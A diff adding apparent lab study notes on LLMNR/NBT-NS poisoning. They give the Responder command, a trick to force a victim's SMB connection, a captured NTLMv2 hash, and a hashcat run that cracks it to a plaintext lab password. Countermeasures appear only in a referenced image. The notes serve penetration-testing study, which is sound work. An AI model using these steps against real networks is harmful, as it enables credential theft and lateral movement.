@@ -1,0 +1,94 @@
+LLMNR = Link Local Multicast Name Resolution
+
+NBTNS = NetBIOS Name Service (Older than LLMNR)
+
+They are used to identify a host when a DNS Resolution fails. LLMNR and NTBNS both send the Windows Username and Hashed Password (as NTLMv1 or NTLMv2 format).
+We also use them when connecting to a Shared drive/folder, by using Name Resolution. 
+
+See image on this folder "llmnr_nbtns_working" to see how it works, and how we as an attacker can become a MiTM in order to receive the hash. Pretty much when the victim tries to look for a network shared that is not known (such as he/she mispelled the network share name by accident), the AD or the server will not know what share the victim is looking for and will reply with "I have no idea", and so the victim will Broadcast by using LLMNR or NBTNS if anyone knows the mispelled network share is, and the hacker will falsely claim to know where it is and reply back saying "I do, send me your hash and I'll connect you", so the victim sends us the hash, and then we might be able to crack it using other tools such as Hashcat. We also use NTLM Relay or Pass the Hash attack, which is pretty much sending the hash itself to authentiate, without ever knowing that the password is.
+
+In order to sit in between and be able to capture these LLMNR or NBTNS packets, we will use a tool call "Responder".
+
+$ locate Resonder.py
+/usr/share/responder/Responder.py
+
+Commands used:
+# python Responder.py -I eth0 -rdwf
+
+Once we start listening for LLMNR-NBTNS request, we can simply go to Windows 2016 or Windows 10 machine an open the shared drives from Explorer. However there's a more efficient way to force it to capture a hash. Here's the trick:
+
+Copy the IP of Kali Machine (this machine), and go to Windows 10 Explorer, and paste the IP in the Search Path Bar as so: \\[Kali-IP]\ , and click enter. This will trigger LLMNR-NBTNS requests (in order to connect to Kali machine root folder), which we will spoof the answer, and hence receive the Windows 10 NTLMv2 credentials (Username, Client IP, and Hashed Password).
+
+The reason we received NTLM SMB User Credentials is because we put our Kali IP as the shared network drive to connect, on the Windows 10, so the Win 10 machine will send out NTLMv2 creds over to us. We can do this on any computer on the network (try to connect to our hacking computer, in order to receive their SMB creds).
+
+Example output since we started listening:
+
+[+] Listening for events...
+[*] [NBT-NS] Poisoned answer sent to 192.168.100.8 for name MARVEL (service: Local Master Browser)
+[*] [NBT-NS] Poisoned answer sent to 192.168.100.8 for name MARVEL (service: Local Master Browser)
+[*] [NBT-NS] Poisoned answer sent to 192.168.100.62 for name MARVEL (service: File Server)
+[*] [LLMNR]  Poisoned answer sent to 192.168.100.62 for name MARVEL
+[*] [LLMNR]  Poisoned answer sent to 192.168.100.62 for name MARVEL
+[*] [LLMNR]  Poisoned answer sent to 192.168.100.17 for name LAPTOP-JP
+[*] [MDNS] Poisoned answer sent to 192.168.100.61  for name THE-PUNISHER.local
+[*] [LLMNR]  Poisoned answer sent to 192.168.100.61 for name THE-PUNISHER
+[*] [MDNS] Poisoned answer sent to 192.168.100.61  for name THE-PUNISHER.local
+[*] [LLMNR]  Poisoned answer sent to 192.168.100.61 for name THE-PUNISHER
+[*] [MDNS] Poisoned answer sent to 192.168.100.61  for name THE-PUNISHER.local
+[*] [LLMNR]  Poisoned answer sent to 192.168.100.61 for name THE-PUNISHER
+[*] [LLMNR]  Poisoned answer sent to 192.168.100.17 for name LAPTOP-JP
+[SMB] NTLMv2-SSP Client   : 192.168.100.61
+[SMB] NTLMv2-SSP Username : MARVEL\fcastle
+[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:a04b8d8ea5a5de0c:A8C7ABBBCF266E01803856E209667C9A:0101000000000000C0653150DE09D201B0B8DAE7689D2934000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000B9991F265A9840434CC4B968C13C23407D578104678210F9F57750281F5858210A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100300030002E00340037000000000000000000                                                                                                                                                                                                              
+[*] Skipping previously captured hash for MARVEL\fcastle
+[*] Skipping previously captured hash for MARVEL\fcastle
+[*] Skipping previously captured hash for MARVEL\fcastle
+[*] Skipping previously captured hash for MARVEL\fcastle
+[*] Skipping previously captured hash for MARVEL\fcastle
+[*] Skipping previously captured hash for MARVEL\fcastle
+[*] Skipping previously captured hash for MARVEL\fcastle
+[*] Skipping previously captured hash for MARVEL\fcastle
+
+-------------------------------------------------------------
+
+Once we have the Password hash (NTLMv2 hash), we can do the following:
+
+$ hashcat -m 5600 NTLMv2_pass_hash /usr/share/wordlists/rockyou.txt --force
+
+I've added by fcastle user's password to rockyou.txt file, so it was able to crack it:
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344393
+* Bytes.....: 139921521
+* Keyspace..: 14344386
+* Runtime...: 2 secs
+
+FCASTLE::MARVEL:a04b8d8ea5a5de0c:a8c7abbbcf266e01803856e209667c9a:0101000000000000c0653150de09d201b0b8dae7689d2934000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000200000b9991f265a9840434cc4b968c13c23407d578104678210f9f57750281f5858210a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e003100300030002e00340037000000000000000000:Kawaninjazx6r
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: NetNTLMv2
+Hash.Target......: FCASTLE::MARVEL:a04b8d8ea5a5de0c:a8c7abbbcf266e0180...000000
+Time.Started.....: Fri Dec 20 15:50:44 2019 (0 secs)
+Time.Estimated...: Fri Dec 20 15:50:44 2019 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   318.3 kH/s (6.37ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 155648/14344386 (1.09%)
+Rejected.........: 0/155648 (0.00%)
+Restore.Point....: 151552/14344386 (1.06%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: armas -> shell3
+
+Started: Fri Dec 20 15:50:18 2019
+Stopped: Fri Dec 20 15:50:46 2019
+
+----------------------------------------------------------------
+
+We could have also used johntheripper for NTLMv2 hash cracking as well. In this case, when we run hashcat to crack the hash, it will give us some OpenCL errors and we can override it by using '--force' option, however the performance and speed will be greatly degraded, so we can download hashcat on our Windows computer, and any dictionary such as SecList or rockyou.txt on it, and simply crack the hash from Windows. On windows we wont receive any OpenCL problems and we will be using full CPU capacity for cracking.
+
+DEFENSES/COUNTERMEASURES:
+
+Please open the image on this folder named: "llmnr-nbtns_defenses.png"
